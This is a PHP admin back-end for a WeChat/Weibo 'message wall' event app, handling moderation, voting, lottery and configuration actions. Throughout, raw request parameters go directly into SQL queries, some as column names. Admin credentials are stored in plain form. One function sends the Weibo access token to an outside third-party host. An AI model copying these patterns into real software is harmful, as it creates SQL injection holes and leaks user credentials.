<?php

@header("Content-type: text/html; charset=utf-8");
session_start();
if(isset($_SESSION[realpath("..").'admin']) && $_SESSION[realpath("..").'admin'] == true){


} else {

$_SESSION[realpath("..").'admin'] = false;

echo "<script>window.location='login.php';</script>";
die;
}
include("db.php");

if(isset($_GET['do'])){

	$do = $_GET['do'];

	@$cid = $_GET['cid'];
	@$config = $_GET['cof'];

}else{

	die("invild action");

}



switch($do){

	    case "huati":

		huati();	

  echo "<script>alert('话题已经修改！');location.href='sysset.php';</script>";

 		break;

		

		case "huanying1":

		huanying1();	

  echo "<script>alert('恭喜你，欢迎语1已经修改，请前往前台测试。');location.href='sysset.php';</script>";

 		break;

		case "interval":
		interval();	
 		break;

		case "refreshtime":
		refreshtime();	
 		break;

		case "huanying2":

		huanying2();	

  echo "<script>alert('恭喜你，欢迎语2已经修改，请前往前台测试。');location.href='sysset.php';</script>";

 		break;



		case "success":

		success();	

  echo "<script>alert('恭喜你，微信回复已经修改，请在微信进行测试。');location.href='sysset.php';</script>";

 		break;

		

		case "field":

		field();	

  echo "<script>alert('恭喜你，微信回复已经修改，请在微信进行测试。');location.href='sysset.php';</script>";

 		break;


		case "confswitch":
		confswitch();	
 		break;

		case "plugswitch":
		plugswitch();	
 		break;


		case "plugsconf":
		plugsconf();	
 		break;

		case "isshenghe":
		isshenghe();	
 		break;

  		case "isfusion":
		isfusion();
 		break;
		
		case "autopush":
		autopush();	
 		break;


		case "del":

		DoDelete();

  echo "<script>location.href='shenhe.php';</script>";

		break;

  

		case "shenhe":

		DoShenhe($cid);	

  echo "<script>location.href='shenhe.php';</script>";

 		break;

  		

		case "toupiao":

		toupiao();	

 		break;
		
		
		case "changeconfig":
		changeconfig($config);	
 		break;

		
		
		//抽奖
		case "cj_verify":
		cj_verify();	
 		break;

		case "cj_award":
		cj_award();	
 		break;

		case "chongzhi":

		chongzhi();	

  echo "<script>alert('操作成功，你的投票已经全部归位【0】！');location.href='vote.php';</script>";

 		break;



		case "zengjian":

		zengjian();	
 		break;
		
		case "fasionconfig":
		fasionconfig();	
 		break;

		case "voteconfig":
		voteconfig();	
 		break;

  		case "del_all":

		DoDel_all();	

  echo "<script>alert('操作成功，你的微信墙已经焕然一新哦！');location.href='shenhe.php';</script>";

 		break;



  		case "del_vote":

		DoDel_vote();	

  echo "<script>alert('操作成功，用户信息已全部清空，可重新录入！');location.href='shenhe.php';</script>";

 		break;


	
  		case "gaimi":

		gaimi();

  echo "<script>alert('操作成功，请您重新登陆！');location.href='shenhe.php';</script>";

 		break;
		
		
  		case "addmassage":

		addmassage();

 		break;


//以下为摇一摇函数调用

  		case "shake_title":

		shake_title();

  echo "<script>alert('摇一摇标题已经成功修改！');location.href='shake.php';</script>";

 		break;



  		case "endshake":

		endshake();

  echo "<script>alert('摇晃停止数量已经成功修改！');location.href='shake.php';</script>";

 		break;
		
		
		
  		case "show_num":

		show_num();

  echo "<script>alert('大屏幕显示数量已经成功修改！');location.href='shake.php';</script>";

 		break;
		
  		case "shake_ready":
		shake_ready();
  echo "<script>alert('恭喜！游戏初始化成功！');location.href='shake.php';</script>";
 		break;
		
  		case "shake_reset":
		shake_reset();
  echo "<script>alert('恭喜！摇一摇用户数据已全部清空！');location.href='shake.php';</script>";
 		break;
		
		/*---
		以下为模拟登陆所需函数
		---
		---
		*/
  		case "monidetection":
		monidetection();
 		break;

  		case "monilogin":
		monilogin();
 		break;
		
  		case "getimgcode":
		getimgcode();
 		break;
		
  		case "set_weixin_conf":
		set_weixin_conf();
 		break;
		
  		case "set_weibo_conf":
		set_weibo_conf();
 		break;
		
		}

function huati(){

$huati=$_POST['name'];

$sql_ht="UPDATE  `weixin_wall_config` SET  `huati` =  '$huati'";

mysql_query($sql_ht);

}

function changeconfig($config){

$value=$_POST['name'];

$sql_ht="UPDATE  `weixin_wall_config` SET  `$config` =  '$value'";

mysql_query($sql_ht);
echo "<script>alert('恭喜!配置修改成功！');history.go(-1);</script>";
};	


function interval(){
$huati=$_POST['name'];
$sql_ht="UPDATE  `weixin_wall_config` SET  `timeinterval` =  '$huati'";
mysql_query($sql_ht);
echo "<script>alert('恭喜！时间间隔已经修改成功！');history.go(-1);</script>";
}

function refreshtime(){
$huati=$_POST['name'];
$sql_ht="UPDATE  `weixin_wall_config` SET  `refreshtime` =  '$huati'";
mysql_query($sql_ht);
echo "<script>alert('恭喜！时间间隔已经修改成功！');history.go(-1);</script>";
}

function huanying1(){

$huati=$_POST['name'];

$sql_ht="UPDATE  `weixin_wall_config` SET  `huanying1` =  '$huati'";

mysql_query($sql_ht);

}



function huanying2(){

$huati=$_POST['name'];

$sql_ht="UPDATE  `weixin_wall_config` SET  `huanying2` =  '$huati'";

mysql_query($sql_ht);

}



function success(){

$huati=$_POST['name'];

$sql_ht="UPDATE  `weixin_wall_config` SET  `success` =  '$huati'";

mysql_query($sql_ht);

}



function field(){

$huati=$_POST['name'];

$sql_ht="UPDATE  `weixin_wall_config` SET  `field` =  '$huati'";

mysql_query($sql_ht);

}

function plugswitch(){

$cid = $_GET['cid'];
$switchname = $_GET['switchname'];

$sql_sh="UPDATE  `weixin_plugs` SET  `switch` =  '$cid' where `name`='$switchname'";
mysql_query($sql_sh);

}
function plugsconf(){
    global $config;
    $value=$_POST['name'];
    $sql_sh="UPDATE  `weixin_plugs` SET  `keyword` =  '$value' where `name`='$config'";
    mysql_query($sql_sh);
    echo "<script>alert('恭喜!配置修改成功！');history.go(-1);</script>";

}

function confswitch(){

$cid = $_GET['cid'];
$switchname = $_GET['switchname'];

$sql_sh="UPDATE  `weixin_wall_config` SET  `$switchname` =  '$cid'";
mysql_query($sql_sh);

}

function isshenghe(){

$cid = $_GET['cid'];

$sql_sh="UPDATE  `weixin_wall_config` SET  `shenghe` =  '$cid'";

mysql_query($sql_sh);

}


function autopush(){
$cid = $_GET['cid'];
$sql_sh="UPDATE  `weixin_wall_config` SET  `cjreplay` =  '$cid'";
mysql_query($sql_sh);

}

function isfusion(){
$cid = $_GET['cid'];
$sql_sh="UPDATE  `weixin_wall_config` SET  `fusionopen` =  '$cid'";
mysql_query($sql_sh);

}


function DoShenhe($cid){

$sql_num="SELECT * FROM  `weixin_wall_num` ";

$query_num=mysql_query($sql_num);

$q=mysql_fetch_row($query_num);

$num=$q[0];

$sql_flg="SELECT * FROM  `weixin_wall` WHERE `id` = '$cid'";

$query_num=mysql_query($sql_flg);

$q=mysql_fetch_row($query_num);

$fakeid=$q[2];
$content=$q[4];
$datetime=$q[10];

$sql2="UPDATE  `weixin_flag` SET `status` =  '2',`content` = '$content',`datetime`='$datetime' WHERE `fakeid` = '$fakeid' and `status` !=  '1'";

$query2=mysql_query($sql2);

$sql1="UPDATE  `weixin_wall` SET  `ret` =  '1',`num` = '$num' WHERE  `id` = '$cid'";

$query1=mysql_query($sql1);

if($query1){

$sql_num="UPDATE `weixin_wall_num` SET `num` = `num`+1";

$query_num=mysql_query($sql_num);

}

}

function DoDelete(){

$cid = $_GET['cid'];

$sql_del="delete FROM  `weixin_wall` where `id` = '$cid' ";

mysql_query($sql_del);

}


function fasionconfig(){
    $keyword=$_POST['fusionkeyword'];
	$url=$_POST['fusionurl'];
	$token=$_POST['fusiontoken'];
if($keyword != ''){
	$sql_gm="UPDATE `weixin_wall_config` SET `fusionkeyword` = '$keyword',`fusionurl` = '$url',`fusiontoken`='$token'";
	mysql_query($sql_gm);
    echo "<script>alert('恭喜!配置修改成功！');history.go(-1);</script>";
}else{
    echo "<script>alert('对不起，关键字不能为空，请返回配置！');history.go(-1);</script>";
}
}

function voteconfig(){

	$votetiltle=$_POST['votetiltle'];

	$voterefresht=$_POST['voterefresht'];
	$voteshowway=$_POST['voteshowway'];
    $votecannum=$_POST['votecannum'];
	$sql_vote="UPDATE `weixin_wall_config` SET `votecannum`='$votecannum',`votetitle` = '$votetiltle',`votefresht` = '$voterefresht',`voteshowway`='$voteshowway'";

	mysql_query($sql_vote);
	
	echo "<script>alert('恭喜!配置修改成功！');history.go(-1);</script>";

	}

function toupiao(){

$name=$_GET['name'];
$cid=$_GET['cid'];

$sql_tp="UPDATE `weixin_vote` SET `name` = '$name' WHERE `id` = '$cid' ";

mysql_query($sql_tp);

echo 1;

}



function zengjian(){

$cid = $_GET['cid'];

$numdel = $_GET['numdel'];

if ($cid == "2"){

		$sql = "delete FROM  `weixin_vote` where `id` = '$numdel' ";

		mysql_query($sql);
		echo "1";
				}

else if ($cid == "1"){


		$sql = "INSERT INTO `weixin_vote` (`id`,`name`,`res`) VALUES ('','店谱网','0')";

		mysql_query($sql);
  echo "<script>alert('操作成功，已经增加一项！');location.href='vote.php';</script>";

		}



}



function chongzhi(){
$sql_cj="UPDATE `weixin_vote` SET `res` = '0' ";

mysql_query($sql_cj);

$sql="UPDATE `weixin_flag` SET `vote` = '0'";

mysql_query($sql);

}



function DoDel_all(){

mysql_query("TRUNCATE TABLE weixin_wall");

mysql_query("UPDATE `weixin_wall_num` SET `num` = 1");

}



function DoDel_vote(){

mysql_query("TRUNCATE TABLE weixin_flag");

mysql_query("UPDATE `weixin_cookie` SET `cookie` =  '',`cookies` = '',`token` = '' WHERE `id` = '1'");

mysql_query("UPDATE `weixin_wall_num` SET `lastmessageid` = 0");
}



function gaimi(){

	$user=$_POST['user'];

	$pwd=$_POST['pwd'];

	$sql_gm="UPDATE `weixin_admin` SET `user` = '$user',`pwd` = '$pwd'";

	mysql_query($sql_gm);
	
session_start();
unset($_SESSION['admin']);
	}
	
	
function addmassage(){

	$data=$_GET['data'];
	$nickname=bin2hex('系统公告');
	$data=bin2hex($data);
	$sql_add="INSERT INTO `weixin_wall` (`id`,`messageid`,`fakeid`,`num`,`content`,`nickname`,`avatar`,`ret`,`fromtype`,`image`) VALUES (NULL,'0','123','-1','$data','$nickname','../img/0.jpg','0','weixin','')";

	mysql_query($sql_add);

	  $cidD = mysql_query('select id from `weixin_wall` WHERE id =(select max(id) from `weixin_wall`)');
	  $row = mysql_fetch_array($cidD, MYSQL_ASSOC);
	  $maxid = $row['id'];
	  DoShenhe($maxid);
	}
/**
 * 设置微博，微信参数
 * */
function set_weixin_conf(){
    if(!empty($_FILES['erweima']['type'])){
        //上传的文件
        include('updata.php');
        $erweifile=updateimg($_FILES['erweima'],'weixin-ma');
        $_POST['erweima']=$erweifile;
    }
    $weixin_configc=new M('weixin_config');
	$save=$weixin_configc->update('id=1',$_POST);
echo "<script>alert('微信墙已经配置成功！');history.go(-1);</script>";
}
function set_weibo_conf(){
    if(empty($_POST['folllow'])){
        $_POST['folllow']=0;
    }
    if(empty($_POST['mention'])){
        $_POST['mention']=0;
    }
    if(empty($_POST['letter'])){
        $_POST['letter']=0;
    }
    if(!empty($_FILES['erweima']['type'])){
        //上传的文件
        include('updata.php');
        $erweifile=updateimg($_FILES['erweima'],'weibo-ma');
        $_POST['erweima']=$erweifile;
    }
    file_get_contents("http://xbsslcurl.sinaapp.com/weiboapi/chengxml.php?token=".$_POST['access_token']);
    $weixin_configc=new M('weibo_config');
	$save=$weixin_configc->update('id=1',$_POST);
echo "<script>alert('微博墙已经配置成功！');history.go(-1);</script>";
}

//抽奖函数	
function cj_verify(){
	$cid =$_GET['cid'];
    //file_get_contents(Web_ROOT . "/weixin/dianplu.php?action=cj&type=wins&tofakeid={$cid}");
    $flags=new M('flag');
    $flag=$flags->find('fakeid='.$cid);
		$contant = '恭喜恭喜！此条为验证消息，您的获奖验证码是：【'.$cid.'】';
		if($flag['fromtype']=='weibo'){
	        $weibo_configs=new M('weibo_config');
	        $weibo_config=$weibo_configs->find();
    	    include("../weibo/sendmessage.php");
    	    send($weibo_config['access_token'],$contant,$flag['openid']);
	    }
	    if($flag['fromtype']=='weixin'){
    	    include("../weixin/sendmessage.php");
    		sendmassage($flag['openid'],$contant);
	    }

  echo "<script>alert('验证信息已经发送，请勿频繁发送！');location.href='cj.php';</script>";
	}
function cj_award(){
	$cid =$_GET['cid'];
	$sql_gm="UPDATE `weixin_flag` SET `cjstatu` = '1' where `id` = '$cid'";

	mysql_query($sql_gm);
	  echo "<script>alert('奖品已发出！');location.href='cj.php';</script>";
	}
/*以下为摇一摇函数*/
function shake_title(){

	$name=$_POST['firstname'];

	$sql_gm="UPDATE `weixin_wall_config` SET `acttitle` = '$name'";

	mysql_query($sql_gm);

	}
	
	function endshake(){

	$name=$_POST['endnum'];

	$sql_gm="UPDATE `weixin_wall_config` SET `endshake` = '$name'";

	mysql_query($sql_gm);

	}
	
	
	function show_num(){

	$name=$_POST['shownum'];

	$sql_gm="UPDATE `weixin_wall_config` SET `show_num` = '$name'";

	mysql_query($sql_gm);

	}
	
	function shake_ready(){
//实例化一个memcache对象
if(!empty($_SERVER['HTTP_APPNAME'])){
    @$mem=memcache_init();
	$mem->flush();

} 
else if(class_exists("Memcache")){
    if(class_exists("Alibaba")){
        @$mem=Alibaba::cache();
                        $sql = 'SELECT * FROM  `weixin_shake_toshake`';
                $query1=mysql_query($sql);
				 while($z=mysql_fetch_assoc($query1)){
					$mem->delete(realpath("..").$z['wecha_id']);
				 }
			$start=realpath("..")."UPDATE  `weixin_wall_config` SET  `isopen` = ";
            $key2 = substr(md5($start), 10, 8);
            $mem->delete($key2);

    }else{
		@$mem=new Memcache;
		@$mem->connect('localhost','11211');
		$mem->flush();
    }
}

	mysql_query("UPDATE `weixin_wall_config` SET `isopen` = '1'");

mysql_query("UPDATE `weixin_shake_toshake` SET `point` = '0'");
	}

function shake_reset(){
//实例化一个memcache对象
if(!empty($_SERVER['HTTP_APPNAME'])){
    @$mem=memcache_init();
    		$mem->flush();

} 
else if(class_exists("Memcache")){
    if(class_exists("Alibaba")){
        @$mem=Alibaba::cache();
                                $sql = 'SELECT * FROM  `weixin_shake_toshake`';
                $query1=mysql_query($sql);
				 while($z=mysql_fetch_assoc($query1)){
					$mem->delete(realpath("..").$z['wecha_id']);
				 }
			$start=realpath("..")."UPDATE  `weixin_wall_config` SET  `isopen` = ";
            $key2 = substr(md5($start), 10, 8);
            $mem->delete($key2);

    }else{
		@$mem=new Memcache;
		@$mem->connect('localhost','11211');
				$mem->flush();

    }
}
mysql_query("TRUNCATE TABLE weixin_shake_toshake");

	$sql_gm="UPDATE `weixin_wall_config` SET `isopen` = '1'";

	mysql_query($sql_gm);

	}
	
	

?>